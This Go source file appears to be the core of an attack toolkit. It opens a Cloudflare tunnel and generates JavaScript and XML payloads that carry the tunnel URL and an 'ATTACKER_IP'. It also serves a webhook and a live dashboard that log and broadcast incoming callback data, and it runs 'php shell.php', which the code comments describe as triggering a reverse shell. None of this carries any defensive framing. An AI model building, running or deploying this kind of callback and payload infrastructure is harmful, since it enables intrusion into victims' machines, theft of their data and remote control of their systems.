package internal

import (
	"bytes"
	"embed"
	"fmt"
	"html/template"
	"io"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/rs/cors"
)

// Embed templates directory
//
//go:embed ../templates
var tplFS embed.FS

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func Run() {
	ip := detectLocalIP()
	fmt.Println("✅ Local IP detected:", ip)

	tunnelURL := startCloudflared()
	fmt.Println("🌐 Tunnel URL:", tunnelURL)

	genPayloads(tunnelURL, ip)
	fmt.Println("📦 Payloads generated at ./payloads/output")

	go startServer()
	fmt.Println("🛰️ Server + Dashboard running on http://localhost:3000")

	select {} // block forever
}

func detectLocalIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		log.Fatal("Failed to get network interfaces:", err)
	}
	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	log.Fatal("Cannot detect local IP")
	return ""
}

func startCloudflared() string {
	cmd := exec.Command("cloudflared", "tunnel", "--url", "http://localhost:3000")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal("cloudflared stdout pipe:", err)
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		log.Fatal("Failed to start cloudflared:", err)
	}
	re := regexp.MustCompile(`https://[\w-]+\.trycloudflare\.com`)
	buf := make([]byte, 4096)
	for {
		n, _ := stdout.Read(buf)
		out := string(buf[:n])
		if m := re.FindString(out); m != "" {
			return m
		}
	}
}

func genPayloads(cfURL, attackerIP string) {
	// read templates
	tplFs, _ := fs.Sub(tplFS, "templates")
	jsTpl := template.Must(template.ParseFS(tplFs, "payload.js.tpl"))
	xmlTpl := template.Must(template.ParseFS(tplFs, "font-payload.xml.tpl"))

	outDir := filepath.Join("payloads", "output")
	os.MkdirAll(outDir, 0755)

	data := map[string]interface{}{
		"CF_URL":      cfURL,
		"EVENT_TIME":  time.Now().Unix(),
		"ATTACKER_IP": attackerIP,
	}

	// generate payload.js
	var jsBuf bytes.Buffer
	jsTpl.Execute(&jsBuf, data)
	os.WriteFile(filepath.Join(outDir, "payload.js"), jsBuf.Bytes(), 0644)

	// generate font-payload.xml
	var xmlBuf bytes.Buffer
	xmlTpl.Execute(&xmlBuf, data)
	os.WriteFile(filepath.Join(outDir, "font-payload.xml"), xmlBuf.Bytes(), 0644)
}

func startServer() {
	r := mux.NewRouter()
	// Webhook endpoint
	r.HandleFunc("/webhook", webhookHandler).Methods("POST")
	// Dashboard static files
	r.PathPrefix("/dashboard/").Handler(http.StripPrefix("/dashboard/", http.FileServer(http.Dir("dashboard"))))
	// WebSocket endpoint
	r.HandleFunc("/ws", wsHandler)

	handler := cors.AllowAll().Handler(r)
	http.ListenAndServe(":3000", handler)
}

var clients = make(map[*websocket.Conn]bool)

func webhookHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	entry := fmt.Sprintf("[%s] %s → %s\n", time.Now().Format(time.RFC3339), r.RemoteAddr, string(body))
	fmt.Print("📡 Signal: ", entry)

	// append to log file
	os.MkdirAll("logs", 0755)
	f, _ := os.OpenFile("logs/requests.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	f.WriteString(entry)
	f.Close()

	// broadcast to dashboard
	for c := range clients {
		c.WriteMessage(websocket.TextMessage, []byte(entry))
	}

	// trigger reverse shell
	exec.Command("php", "shell.php").Start()
	w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	clients[conn] = true
}
